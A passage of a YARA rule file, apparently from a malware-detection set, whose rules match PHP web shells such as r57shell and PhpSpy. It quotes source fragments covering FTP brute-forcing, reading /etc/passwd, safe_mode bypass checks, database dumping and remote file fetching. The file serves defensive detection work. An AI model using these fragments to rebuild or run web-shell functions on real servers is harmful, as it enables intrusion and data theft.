      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3_r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976_r5_47
{
   meta:
      description = "php22 - from files r57shell.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57_Mohajer22.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash2 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash3 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash4 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash5 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x2 = "ox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"))));" fullword ascii
      $s3 = "ver']):(\"localhost\"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):(\"3306\"))));" fullword ascii
      $s4 = "]):(\"mysql\"))).' <b>.</b> '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"))));" fullword ascii
      $s5 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s6 = "$extra = \"-C \".$_POST['test5_file'].\" -X /tmp/mb_send_mail\";" fullword ascii
      $s7 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii
      $s8 = "else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v.\"\\r\\n\"); }" fullword ascii
      $s9 = "if(@ociexecute($this->res))" fullword ascii
      $s10 = "if(isset($_GET['users']))" fullword ascii
      $s11 = "echo sr(35,\"<b>\".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow.\"</b>\",in('text','mysql_l',15,(!empty($_" ascii
      $s12 = "if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection)))" fullword ascii
      $s13 = "if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '<div id=\"'.$id.'\" style=\"display: none;\">';" fullword ascii
      $s14 = "echo $fs.$table_up1.$lang[$language.'_text112'].up_down('id22').$table_up2.div('id22').$ts;" fullword ascii
      $s15 = "echo $fs.$table_up1.$lang[$language.'_text113'].up_down('id23').$table_up2.div('id23').$ts;" fullword ascii
      $s16 = "echo $fs.$table_up1.$lang[$language.'_text114'].up_down('id24').$table_up2.div('id24').$ts;" fullword ascii
      $s17 = "if(!function_exists('ocilogon')) return 0;" fullword ascii
      $s18 = "if (@file_exists('/tmp/mb_send_mail')) @unlink('/tmp/mb_send_mail');" fullword ascii
      $s19 = "if(false===($this->res=@mssql_query($query,$this->connection)))" fullword ascii
      $s20 = "\"password\"))));" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r577_r57_iFX_r57_kartal_48
{
   meta:
      description = "php22 - from files r577.php, r57_iFX.php, r57_kartal.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash2 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash3 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
   strings:
      $x1 = "$_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s2 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s3 = "echo $table_up1.$lang[$language.'_text81'].$table_up2.$ts.\"<tr>\".$fs.\"<td valign=top width=34%>\".$ts;" fullword ascii
      $s4 = "echo $table_up1.$lang[$language.'_text82'].$table_up2.$ts.\"<tr>\".$fs.\"<td valign=top width=34%>\".$ts;" fullword ascii
      $s5 = "echo \" | - \".$row2['TABLE_NAME'].\"\\r\\n\";" fullword ascii
      $s6 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text40'].\"</div></b></font>\";" fullword ascii
      $s7 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text12'].\"</div></b></font>\";" fullword ascii
      $s8 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text22'].\"</div></b></font>\";" fullword ascii
      $s9 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text77'].\"</div></b></font>\";" fullword ascii
      $s10 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text9'].\"</div></b></font>\";" fullword ascii
      $s11 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text83'].\"</div></b></font>\";" fullword ascii
      $s12 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DATABAS" ascii
      $s13 = "else echo \"<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to MySQL server</b></font></div>\";" fullword ascii
      $s14 = "echo $fs.$table_up1.$lang[$language.'_text32'].$table_up2.$font;" fullword ascii
      $s15 = "\\nSELECT * FROM user;\")).\"</textarea><br>\".in('submit','submit',0,$lang[$language.'_butt1']).\"</div></td>\".$fe.\"</tr></ta" ascii
      $s16 = "echo $fs.$table_up1.$lang[$language.'_text76'].$table_up2.$ts;" fullword ascii
      $s17 = "echo $fs.$table_up1.$lang[$language.'_text67'].$table_up2.$ts;" fullword ascii
      $s18 = "echo $fs.$table_up1.$lang[$language.'_text35'].$table_up2.$ts;" fullword ascii
      $s19 = "echo $fs.$table_up1.$lang[$language.'_text33'].$table_up2.$ts;" fullword ascii
      $s20 = "echo $fs.$table_up1.$lang[$language.'_text15'].$table_up2.$ts;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _PHPSPY_PhpSpyVer2006_phpspy_2005_full_phpspy_2006_PhpSpy_Ver_2006_49
{
   meta:
      description = "php22 - from files PHPSPY.php, PhpSpyVer2006.php, phpspy_2005_full.php, phpspy_2006.php, PhpSpy_Ver_2006.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e349d8a219a43f3dd1339ec5ca39764956401f3820b5000fe25ff18845edff29"
      hash2 = "cdb2650f3e0f6e7e2bc112329f142c9171c953ba62f849f3f16a0f65ec9a8e6f"
      hash3 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash4 = "b0a12e6daee4649ae1ee375c6b6fde658add204d0d521bc208906385d83036e3"
      hash5 = "b0dcae77eabc407c53c0b2b6fe74d0749bc2fa4fd9a560b40400a64d2959492c"
   strings:
      $s1 = "max_execution_time\",getphpcfg(\"max_execution_time\").\"" fullword ascii
      $s2 = "@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);" fullword ascii
      $s3 = "$upsize=get_cfg_var(\"file_uploads\") ? get_cfg_var(\"upload_max_filesize\") : \"" fullword ascii
      $s4 = "sqldumptable($currow[0], $filehandle);" fullword ascii
      $s5 = "echo \"<tr><td width=40% style=\\\"padding-left: 5px;\\\">\".$info[$i][0].\"</td><td>\".$info[$i][1].\"</td></tr>\\n\";" fullword ascii
      $s6 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword ascii
      $s7 = "$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? \"<a href=\\\"mailto:\".$_SERVER['SERVER_ADMIN'].\"\\\">\".$_SERVER['SERVER_ADMIN" ascii
      $s8 = "elseif ($_GET['action'] == \"fileperm\") {" fullword ascii
      $s9 = "elseif ($_GET['action'] == \"sqlbak\") {" fullword ascii
      $s10 = "header(\"Accept-Length: \".strlen($code));" fullword ascii
      $s11 = "if ($kname != \"PRIMARY\" and $key['Non_unique'] == 0) {" fullword ascii
      $s12 = "<FORM action=\"\" method=\"POST\">" fullword ascii
      $s13 = "$rows = mysql_query(\"SELECT * FROM $table\");" fullword ascii
      $s14 = "header(\"Accept-Ranges: bytes\");" fullword ascii
      $s15 = "$keys = mysql_query(\"SHOW KEYS FROM $table\");" fullword ascii
      $s16 = "$ctime=\"<span class=\\\"redfont\\\">\".@date(\"Y-m-d H:i:s\",@filectime($filepath)).\"</span>\";" fullword ascii
      $s17 = "$mtime=\"<span class=\\\"redfont\\\">\".@date(\"Y-m-d H:i:s\",@filemtime($filepath)).\"</span>\";" fullword ascii
      $s18 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \"Yes\" : \"No\";" fullword ascii
      $s19 = "$fields = mysql_query(\"SHOW FIELDS FROM $table\");" fullword ascii
      $s20 = "$dis_func = str_replace(\",\",\"<br>\",$dis_func);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57__15__r57_bd_r57_r57shell_r57shell1_40_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343_50
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57 (15).php, r57-bd.php, r57.php, r57shell.php, r57shell1.40.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_1php.php, r57_4.php, r57_Mohajer22.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash3 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash4 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash5 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash6 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash7 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash8 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash9 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash10 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash11 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash12 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash13 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash14 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash15 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
   strings:
      $s1 = "compress($filename,$filedump,$_POST['compress']);" fullword ascii
      $s2 = "function compress(&$filename,&$filedump,$compress)" fullword ascii
      $s3 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))));" fullword ascii
      $s4 = "$headers .= chunk_split(base64_encode($attach['content'])).\"\\r\\n\";" fullword ascii
      $s5 = "]):(\"/ftp-dir/file\"))).in('hidden','cmd',0,'ftp_file_down'));" fullword ascii
      $s6 = "]):(\"/ftp-dir/file\"))).in('hidden','cmd',0,'ftp_file_up'));" fullword ascii
      $s7 = "$headers .= \"Content-Transfer-Encoding: base64\\r\\n\\r\\n\";" fullword ascii
      $s8 = "if(substr($string,0,1)!='#') array_push($users,$user[0]);" fullword ascii
      $s9 = "$headers .= \"Content-Type: \".$attach['type'];" fullword ascii
      $s10 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
      $s11 = "if ($_POST['cmd']==\"ftp_brute\")" fullword ascii
      $s12 = "$res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);" fullword ascii
      $s13 = "$headers .= \"MIME-Version: 1.0\\r\\n\";" fullword ascii
      $s14 = "\"content\"=>$filedump" fullword ascii
      $s15 = "$headers .= \"; name=\\\"\".$attach['name'].\"\\\"\\r\\n\";" fullword ascii
      $s16 = "$headers  = \"From: $from\\r\\n\";" fullword ascii
      $s17 = "idden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));" fullword ascii
      $s18 = "$content_encoding=$mime_type='';" fullword ascii
      $s19 = "echo sr(15,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').i" ascii
      $s20 = "echo sr(15,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').i" ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57_bd_r57shell1_40_r57shell_v_1_42_edited_by_kibngdefacer_51
{
   meta:
      description = "php22 - from files r57-bd.php, r57shell1.40.php, r57shell_v.1.42_edited_by_kibngdefacer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash2 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash3 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
   strings:
      $s1 = "if(($safe_mode || $open_basedir) && @function_exists('error_log') && @version_compare(@phpversion(),\"5.2.2\")<=0)" fullword ascii
      $s2 = "if(empty($sysctl)) { $sysctl = ex('sysctl -n kernel.ostype && sysctl -n kernel.osrelease'); }" fullword ascii
      $s3 = "if(($safe_mode || $open_basedir) && @function_exists('readfile') && @version_compare(@phpversion(),\"5.2.2\")<=0)" fullword ascii
      $s4 = "if(!isset($_COOKIE['uname'])) { $uname = ex('uname -a'); setcookie('uname',$uname); } else { $uname = $_COOKIE['uname']; }" fullword ascii
      $s5 = "if(($safe_mode || $open_basedir) && $unix && @function_exists('mb_send_mail') && @version_compare(@phpversion(),\"5.2.0\")<=0){" fullword ascii
      $s6 = "if(@rmdir($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>" fullword ascii
      $s7 = "if(($safe_mode || $open_basedir) && @function_exists('ini_restore') && @version_compare(@phpversion(),\"5.2.0\")<=0){" fullword ascii
      $s8 = "if(($safe_mode || $open_basedir) && @function_exists('symlink') && @version_compare(@phpversion(),\"5.2.2\")<=0)" fullword ascii
      $s9 = "if(($safe_mode || $open_basedir) && @function_exists('glob') && @version_compare(@phpversion(),\"5.2.2\")<=0){" fullword ascii
      $s10 = "if(($safe_mode || $open_basedir) && @function_exists('copy') && @version_compare(@phpversion(),\"5.2.0\")<=0)" fullword ascii
      $s11 = "else if(($_POST['brute_method']=='passwd') && (!$users=get_users('/etc/passwd'))){ echo \"<table width=100% cellpadding=0 cellsp" ascii
      $s12 = "if(($safe_mode || $open_basedir) && $curl_on && @version_compare(@phpversion(),\"5.2.0\")<=0)" fullword ascii
      $s13 = "if(($safe_mode || $open_basedir) && @version_compare(@phpversion(),\"5.0.0\")<0){" fullword ascii
      $s14 = "if(($safe_mode || $open_basedir) && @version_compare(@phpversion(),\"5.2.2\")<=0)" fullword ascii
      $s15 = "if(($safe_mode || $open_basedir) && @version_compare(@phpversion(),\"5.2.4\")<=0)" fullword ascii
      $s16 = "if(!isset($_COOKIE['id'])) { $id = ex('id'); setcookie('id',$id); } else { $id = $_COOKIE['id']; }" fullword ascii
      $s17 = "else if(($_POST['brute_method']=='dic') && (!$users=get_users($_POST['dictionary']))){ echo \"<table width=100% cellpadding=0 ce" ascii
      $s18 = "if((!@function_exists('ini_get')) || @ini_get('file_uploads')){" fullword ascii
      $s19 = "else if(isset($_COOKIE['sysctl'])) { $sysctl = $_COOKIE['sysctl']; }" fullword ascii
      $s20 = "echo sr(25,\"<b>\".$lang[$language.'_text107'].$arrow.\"</b>\",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):(\"f" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57__15__r57_r577_r57shell127_r57_1php_r57_4_r57_iFX_r57_kartal_r57_Shell_52
{
   meta:
      description = "php22 - from files r57 (15).php, r57.php, r577.php, r57shell127.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash2 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash3 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash4 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash5 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash6 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash7 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash8 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash9 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s2 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s3 = "$res = @mysql_query(\"SELECT * FROM `\".$_POST['mysql_tbl'].\"`\", $db);" fullword ascii
      $s4 = "if((!empty($_POST['dif'])&&$fp)||(empty($_POST['dif']))){" fullword ascii
      $s5 = "$sql1 .= \"# ---------------------------------\\r\\n\\r\\n\";" fullword ascii
      $s6 = "$header = \"&laquo;\".$pockets[2].\"&raquo;\";" fullword ascii
      $s7 = "if(@mysql_select_db($_POST['mysql_db'],$db))" fullword ascii
      $s8 = "$sql2 .= \"\\r\\n# ---------------------------------\";" fullword ascii
      $s9 = "DirPrintHTMLHeaders($dir.\"/\".$file);" fullword ascii
      $s10 = "function DirPrintHTMLHeaders($dir)" fullword ascii
      $s11 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $db);" fullword ascii
      $s12 = "if(@in_array($ext,array('.htm','.html')))" fullword ascii
      $s13 = "$keys = @implode(\"`, `\", @array_keys($row));" fullword ascii
      $s14 = "$header = '-=None=-';" fullword ascii
      $s15 = "$strings = @file($dir.\"/\".$file) or die(\"Can't open file \".$dir.\"/\".$file);" fullword ascii
      $s16 = "echo \"      <li>\".$header.\"</li>\\n\";" fullword ascii
      $s17 = "$files[$file] = @filesize($dir.\"/\".$file);" fullword ascii
      $s18 = "if(@eregi($pattern,$strings[$a],$pockets))" fullword ascii
      $s19 = "if(@in_array($ext,@explode(';',$types)))" fullword ascii
      $s20 = "$files = @array_merge($dirs,$files);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57__15__r57_r577_r57shell_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3_r57Shell_0fa5df7bbf035_53
{
   meta:
      description = "php22 - from files r57 (15).php, r57.php, r577.php, r57shell.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash2 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash3 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash4 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash5 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash6 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash7 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash8 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash9 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash10 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash11 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash12 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash13 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
   strings:
      $s1 = "if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = \"3306\"; }" fullword ascii
      $s2 = "if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii
      $s3 = "$lin2 = ex('sysctl -n kernel.osrelease');" fullword ascii
      $s4 = "$lin1 = ex('sysctl -n kernel.ostype');" fullword ascii
      $s5 = "echo sr(40,\"<b>\".$lang[$language.'_text25'].$arrow.\"</b>\",in('text','remote_port',15,'6667'));" fullword ascii
      $s6 = "if ($_POST['cmd']==\"db_query\")" fullword ascii
      $s7 = "echo sr(40,\"<b>\".$lang[$language.'_text10'].$arrow.\"</b>\",in('text','port',15,'11457'));" fullword ascii
      $s8 = "echo sr(15,\"<b>\".$lang[$language.'_text6'].$arrow.\"</b>\",in('file','userfile',85,''));" fullword ascii
      $s9 = "if(empty($_POST['cmd'])) {" fullword ascii
      $s10 = "$bsd1 = ex('sysctl -n kern.ostype');" fullword ascii
      $s11 = "$bsd2 = ex('sysctl -n kern.osrelease');" fullword ascii
      $s12 = "echo sr(40,\"<b>\".$lang[$language.'_text23'].$arrow.\"</b>\",in('text','local_port',15,'11457'));" fullword ascii
      $s13 = "if(@ini_get('file_uploads')){" fullword ascii
      $s14 = "_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));" fullword ascii
      $s15 = "if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=" ascii
      $s16 = "if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=" ascii
      $s17 = "xt','param2 title=\"'.$lang[$language.'_text71'].'\"',26,(($_POST['param2'])?($_POST['param2']):(\"0777\"))).in('hidden','cmd',0" ascii
      $s18 = "echo sr(15,\"<b>\".$lang[$language.'_text68'].$arrow.\"</b>\",\"<select name=what><option value=mod>CHMOD</option><option value=" ascii
      $s19 = "while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0]); }" fullword ascii
      $s20 = "$current_version = str_replace('.','',$version);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57_bd_r57shell_r57shell1_40_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3_r57Shell_0fa5df7bbf0_54
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57-bd.php, r57shell.php, r57shell1.40.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57Shell_b16fdf4a3fc21892dcf5f69f802dbd928642b5a4.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_Mohajer22.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash5 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash6 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash7 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash8 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash9 = "71a6b712bed415a8bbfc02e006904d63dca15e0c778f607888e776bc9df700db"
      hash10 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash11 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
   strings:
      $s1 = "$this->dump[] = '## --------------------------------------- ';" fullword ascii
      $s2 = "$this->dump[1] = '## --------------------------------------- ';" fullword ascii
      $s3 = "$this->dump[5] = '## --------------------------------------- ';" fullword ascii
      $s4 = "$this->dump[0] = '## PostgreSQL dump';" fullword ascii
      $s5 = "$this->dump[] = $this->rows[0]['Create Table'];" fullword ascii
      $s6 = "$this->dump[0] = '## ORACLE dump';" fullword ascii
      $s7 = "$this->dump[0] = '## MSSQL dump';" fullword ascii
      $s8 = "$this->dump[0] = '## MySQL dump';" fullword ascii
      $s9 = "$this->dump[0] = '##';" fullword ascii
      $s10 = "$this->error = @pg_last_error($this->connection);" fullword ascii
      $s11 = "$this->error = @mysql_error($this->connection);" fullword ascii
      $s12 = "echo \"<br><form name=form method=POST>\";" fullword ascii
      $s13 = "$mtime = @filemtime($_POST['e_name']);" fullword ascii
      $s14 = "@mssql_close($this->connection);" fullword ascii
      $s15 = "$this->connection = @pg_connect($str);" fullword ascii
      $s16 = "$this->error = 'Query parse error';" fullword ascii
      $s17 = "@oci_close($this->connection);" fullword ascii
      $s18 = "@pg_close($this->connection);" fullword ascii
      $s19 = "$this->error = 'Query error';" fullword ascii
      $s20 = "return @mssql_affected_rows($this->res);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0a0a or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _QueryPath_QueryPath_55
{
   meta:
      description = "php22 - from files QueryPath.php, QueryPath.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f32cbd15de62963afbee35cfcf516e8d78d1918dc366d8969158bdabb5ed7f8b"
      hash2 = "f32cbd15de62963afbee35cfcf516e8d78d1918dc366d8969158bdabb5ed7f8b"
   strings:
      $s1 = "// Allow users to override parser settings." fullword ascii
      $s2 = "set_error_handler(array('QueryPathParseException', 'initializeFromError'), $this->errTypes);" fullword ascii
      $s3 = "$this->matches = $found; // Don't buffer this. It is temporary." fullword ascii
      $s4 = "$this->document = $this->getFirstMatch()->ownerDocument;" fullword ascii
      $s5 = "* @see QueryPathOptions::set()" fullword ascii
      $s6 = "* @see qp()" fullword ascii
      $s7 = "* @endcode" fullword ascii
      $s8 = "* @code" fullword ascii
      $s9 = "while ($m->parentNode->nodeType !== XML_DOCUMENT_NODE) {" fullword ascii
      $s10 = "$query = new QueryPathCssEventHandler($this->matches);" fullword ascii
      $s11 = "$useParser = strtolower($this->options['use_parser']);" fullword ascii
      $s12 = "$this->setMatches($this->document->documentElement);" fullword ascii
      $s13 = "$frag = $this->document->createDocumentFragment();" fullword ascii
      $s14 = "if (qp($m, NULL, $this->options)->is($selector) > 0) {" fullword ascii
      $s15 = "if ($this->matches->count() == 0) return NULL;" fullword ascii
      $s16 = "if (empty($this->options['use_parser'])) {" fullword ascii
      $s17 = "if ($this->options['replace_entities']) {" fullword ascii
      $s18 = "foreach ($this->matches as $m) {" fullword ascii
      $s19 = "$winner = new SplObjectStorage();" fullword ascii
      $s20 = "$xpath = new DOMXPath($this->document);" fullword ascii
   condition:
